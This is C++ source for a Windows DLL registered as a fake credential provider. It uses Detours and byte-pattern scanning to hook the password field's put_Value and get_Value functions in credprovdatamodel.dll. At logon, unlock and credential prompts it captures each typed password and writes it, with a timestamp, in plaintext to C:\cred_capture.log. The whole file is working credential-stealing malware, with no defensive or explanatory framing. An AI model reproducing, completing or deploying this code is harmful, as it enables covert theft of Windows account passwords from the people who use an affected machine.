#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <credentialprovider.h>
#include <unknwn.h>
#include <strsafe.h>
#include <winstring.h>
#include <stdio.h>
#include <new>

#include <detours.h>
#pragma comment(lib, "detours.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "runtimeobject.lib")

// {5C1B3A2D-7F4E-4B0C-9D6E-8F2A1C3B5D7E}
static const CLSID CLSID_CredHookCP = { 0x5c1b3a2d, 0x7f4e, 0x4b0c, { 0x9d, 0x6e, 0x8f, 0x2a, 0x1c, 0x3b, 0x5d, 0x7e } };

// fieldID of the password field in the EditField object of CredProvDataModel.dll
#define FIELD_ID_PASSWORD 5

static HINSTANCE g_hInst = nullptr;
static LONG g_refDll = 0;

// LOGGING
#define LOG_PATH L"C:\\cred_capture.log"

static void Log(const wchar_t* fmt, ...){
    wchar_t wbuf[2048];
    va_list args;
    va_start(args, fmt);
    StringCchVPrintfW(wbuf, ARRAYSIZE(wbuf), fmt, args);
    va_end(args);

    OutputDebugStringW(wbuf);

    FILE* f = nullptr;
    if (_wfopen_s(&f, LOG_PATH, L"at, ccs=UTF-8") == 0 && f) {
        fwprintf(f, L"%s", wbuf);
        fclose(f);
    }
}

typedef HRESULT(__fastcall* EditField_put_Value_t)(void* pThis, HSTRING hstrNewValue);
typedef HRESULT(__fastcall* EditField_get_Value_t)(void* pThis, HSTRING* phstrOut);

static EditField_put_Value_t g_OrigPutValue = nullptr;
static EditField_get_Value_t g_OrigGetValue = nullptr;

static INIT_ONCE g_initOnce = INIT_ONCE_STATIC_INIT;
static wchar_t   g_lastPassword[512] = {};

// HOOK put_Value
HRESULT __fastcall PutValueHook(void* pThis, HSTRING hstrNewValue){
    DWORD fieldID = *(DWORD*)((BYTE*)pThis + 0x48);

    if (fieldID == FIELD_ID_PASSWORD) {
        UINT32 len = 0;
        const wchar_t* raw = WindowsGetStringRawBuffer(hstrNewValue, &len);

        if (raw && len > 0) {
            StringCchCopyW(g_lastPassword, ARRAYSIZE(g_lastPassword), raw);
        }
        else {
            // field cleared after submit, log if we have a pending value
            if (g_lastPassword[0] != L'\0') {
                SYSTEMTIME st;
                GetLocalTime(&st);
                Log(L"\n[CRED] %04u-%02u-%02u %02u:%02u:%02u\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
                Log(L"  password: %s\n", g_lastPassword);
                g_lastPassword[0] = L'\0';
            }
        }
    }

    return g_OrigPutValue(pThis, hstrNewValue);
}

// HOOK get_Value
HRESULT __fastcall GetValueHook(void* pThis, HSTRING* phstrOut){
    HRESULT hr = g_OrigGetValue(pThis, phstrOut);

    DWORD fieldID = *(DWORD*)((BYTE*)pThis + 0x48);

    if (fieldID == FIELD_ID_PASSWORD && SUCCEEDED(hr) && phstrOut && *phstrOut) {
        UINT32 len = 0;
        const wchar_t* raw = WindowsGetStringRawBuffer(*phstrOut, &len);

        if (raw && len > 0) {
            SYSTEMTIME st;
            GetLocalTime(&st);
            Log(L"\n[SUBMIT] %04u-%02u-%02u %02u:%02u:%02u\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
            Log(L"  password: %s\n", raw);
            
            // sync g_lastPassword so the subsequent clear PUT does not log again
            StringCchCopyW(g_lastPassword, ARRAYSIZE(g_lastPassword), raw);
        }
    }

    return hr;
}

// PATTERN SCAN
static BYTE* FindPattern(BYTE* base, size_t size, const BYTE* pattern, const char* mask){
    size_t patLen = strlen(mask);
    for (size_t i = 0; i <= size - patLen; i++) {
        bool found = true;
        for (size_t j = 0; j < patLen; j++) {
            if (mask[j] == 'x' && base[i + j] != pattern[j]) {
                found = false;
                break;
            }
        }
        if (found) {
            return base + i;
        }
    }
    return nullptr;
}

static bool ResolveCPDMHooks(HMODULE hMod){
    // put_Value 
    // 48 89 5C 24 10 55 56 57 41 54 41 55 41 56 41 57 48 8B EC 48 83 EC 40 4C
    static const BYTE patPut[] = {
        0x48, 0x89, 0x5C, 0x24, 0x10,
        0x55, 0x56, 0x57,
        0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
        0x48, 0x8B, 0xEC,
        0x48, 0x83, 0xEC, 0x40,
        0x4C
    };
    static const char maskPut[] = "xxxxxxxxxxxxxxxxxxxxxxxx";

    // get_Value (EditField vtable slot 6)
    // 48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20 33 F6 48 8B DA 48 89 32 48
    static const BYTE patGet[] = {
        0x48, 0x89, 0x5C, 0x24, 0x08,
        0x48, 0x89, 0x74, 0x24, 0x10,
        0x57,
        0x48, 0x83, 0xEC, 0x20,
        0x33, 0xF6,
        0x48, 0x8B, 0xDA,
        0x48, 0x89, 0x32,
        0x48
    };
    static const char maskGet[] = "xxxxxxxxxxxxxxxxxxxxxxxx";

    // locate .text section to narrow the scan
    auto dos = (IMAGE_DOS_HEADER*)hMod;
    auto nt = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);

    BYTE* textBase = nullptr;
    size_t textSize = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            textBase = (BYTE*)hMod + sec[i].VirtualAddress;
            textSize = sec[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textBase) {
        Log(L"<<>> ERROR: .text section not found in credprovdatamodel.dll\n");
        return false;
    }

    Log(L"<<>> scanning .text @ 0x%p size=0x%zX\n", (void*)textBase, textSize);

    BYTE* pPut = FindPattern(textBase, textSize, patPut, maskPut);
    BYTE* pGet = FindPattern(textBase, textSize, patGet, maskGet);

    if (!pPut) {
        Log(L"<<>> ERROR: put_Value pattern not found\n");
        return false;
    }
    if (!pGet) {
        Log(L"<<>> ERROR: get_Value pattern not found\n");
        return false;
    }

    g_OrigPutValue = (EditField_put_Value_t)pPut;
    g_OrigGetValue = (EditField_get_Value_t)pGet;

    Log(L"<<>> put_Value found @ 0x%p\n", (void*)g_OrigPutValue);
    Log(L"<<>> get_Value found @ 0x%p\n", (void*)g_OrigGetValue);

    return true;
}

// INSTALL both hooks
static BOOL CALLBACK DoInstall(PINIT_ONCE, PVOID, PVOID*) {
    Log(L"<<>> installing hooks\n");

    HMODULE hCPDM = GetModuleHandleA("credprovdatamodel.dll");
    Log(L"<<>> credprovdatamodel.dll @ 0x%p\n", (void*)hCPDM);

    if (!hCPDM || !ResolveCPDMHooks(hCPDM)) {
        Log(L"<<>> WARN: could not resolve hooks, aborting\n");
        return TRUE;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    if (g_OrigPutValue) {
        DetourAttach(&(void*&)g_OrigPutValue, PutValueHook);
    }
    if (g_OrigGetValue) {
        DetourAttach(&(void*&)g_OrigGetValue, GetValueHook);
    }

    LONG err = DetourTransactionCommit();

    if (err == NO_ERROR) {
        Log(L"<<>> hooks OK\n");
    }
    else {
        Log(L"<<>> ERROR Detours: %ld\n", err);
    }

    return TRUE;
}

static void RemoveHooks() {
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    if (g_OrigPutValue) {
        DetourDetach(&(void*&)g_OrigPutValue, PutValueHook);
    }
    if (g_OrigGetValue) {
        DetourDetach(&(void*&)g_OrigGetValue, GetValueHook);
    }

    DetourTransactionCommit();
}

class CCredProvider final : public ICredentialProvider {
    LONG m_ref = 1;
    bool m_hooksInstalled = false;

public:
    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppv) override {
        if (!ppv) {
            return E_POINTER;
        }
        if (riid == IID_IUnknown || riid == IID_ICredentialProvider) {
            *ppv = static_cast<ICredentialProvider*>(this);
            AddRef();
            return S_OK;
        }
        *ppv = nullptr;
        return E_NOINTERFACE;
    }

    ULONG STDMETHODCALLTYPE AddRef() override {
        return InterlockedIncrement(&m_ref);
    }

    ULONG STDMETHODCALLTYPE Release() override {
        LONG r = InterlockedDecrement(&m_ref);
        if (!r) {
            delete this;
        }
        return (ULONG)r;
    }

    HRESULT STDMETHODCALLTYPE SetUsageScenario(CREDENTIAL_PROVIDER_USAGE_SCENARIO cpus, DWORD) override {
        switch (cpus) {
        case CPUS_LOGON:
        case CPUS_UNLOCK_WORKSTATION:
        case CPUS_CREDUI:
            if (!m_hooksInstalled) {
                InitOnceExecuteOnce(&g_initOnce, DoInstall, nullptr, nullptr);
                m_hooksInstalled = true;
            }
            return S_OK;
        default:
            return E_NOTIMPL;
        }
    }

    HRESULT STDMETHODCALLTYPE SetSerialization(const CREDENTIAL_PROVIDER_CREDENTIAL_SERIALIZATION*) override {
        return E_NOTIMPL;
    }

    HRESULT STDMETHODCALLTYPE Advise(ICredentialProviderEvents*, UINT_PTR) override {
        return S_OK;
    }

    HRESULT STDMETHODCALLTYPE UnAdvise() override {
        return S_OK;
    }

    HRESULT STDMETHODCALLTYPE GetFieldDescriptorCount(DWORD* pdw) override {
        if (!pdw) {
            return E_POINTER;
        }
        *pdw = 0;
        return S_OK;
    }

    HRESULT STDMETHODCALLTYPE GetFieldDescriptorAt(DWORD, CREDENTIAL_PROVIDER_FIELD_DESCRIPTOR**) override {
        return E_INVALIDARG;
    }

    HRESULT STDMETHODCALLTYPE GetCredentialCount(DWORD* pdwCount, DWORD* pdwDefault, BOOL* pbAuto) override {
        if (!pdwCount || !pdwDefault || !pbAuto) {
            return E_POINTER;
        }
        *pdwCount = 0;
        *pdwDefault = CREDENTIAL_PROVIDER_NO_DEFAULT;
        *pbAuto = FALSE;
        return S_OK;
    }

    HRESULT STDMETHODCALLTYPE GetCredentialAt(DWORD, ICredentialProviderCredential**) override {
        return E_INVALIDARG;
    }
};

class CCredProvFactory final : public IClassFactory {
    LONG m_ref = 1;

public:
    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppv) override {
        if (!ppv) {
            return E_POINTER;
        }
        if (riid == IID_IUnknown || riid == IID_IClassFactory) {
            *ppv = static_cast<IClassFactory*>(this);
            AddRef();
            return S_OK;
        }
        *ppv = nullptr;
        return E_NOINTERFACE;
    }

    ULONG STDMETHODCALLTYPE AddRef() override {
        return InterlockedIncrement(&m_ref);
    }

    ULONG STDMETHODCALLTYPE Release() override {
        LONG r = InterlockedDecrement(&m_ref);
        if (!r) {
            delete this;
        }
        return (ULONG)r;
    }

    HRESULT STDMETHODCALLTYPE CreateInstance(IUnknown* pUnk, REFIID riid, void** ppv) override {
        if (pUnk) {
            return CLASS_E_NOAGGREGATION;
        }
        auto* p = new (std::nothrow) CCredProvider();
        if (!p) {
            return E_OUTOFMEMORY;
        }
        HRESULT hr = p->QueryInterface(riid, ppv);
        p->Release();
        return hr;
    }

    HRESULT STDMETHODCALLTYPE LockServer(BOOL fLock) override {
        if (fLock) {
            InterlockedIncrement(&g_refDll);
        }
        else {
            InterlockedDecrement(&g_refDll);
        }
        return S_OK;
    }
};

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID){
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        g_hInst = hInst;
        DisableThreadLibraryCalls(hInst);
        {
            FILE* f = nullptr;
            if (_wfopen_s(&f, LOG_PATH, L"at, ccs=UTF-8") == 0 && f) {
                fwprintf(f, L"<<>> ATTACH PID=%u\n", GetCurrentProcessId());
                fclose(f);
            }
        }
        break;
    case DLL_PROCESS_DETACH:
        RemoveHooks();
        break;
    }
    return TRUE;
}

STDAPI DllCanUnloadNow() {
    return (g_refDll == 0) ? S_OK : S_FALSE;
}

STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, void** ppv) {
    if (!ppv) {
        return E_POINTER;
    }
    if (rclsid != CLSID_CredHookCP) {
        return CLASS_E_CLASSNOTAVAILABLE;
    }

    auto* pFac = new (std::nothrow) CCredProvFactory();
    if (!pFac) {
        return E_OUTOFMEMORY;
    }

    HRESULT hr = pFac->QueryInterface(riid, ppv);
    pFac->Release();
    return hr;
}

STDAPI DllRegisterServer() {
    return S_OK;
}

STDAPI DllUnregisterServer() {
    return S_OK;
}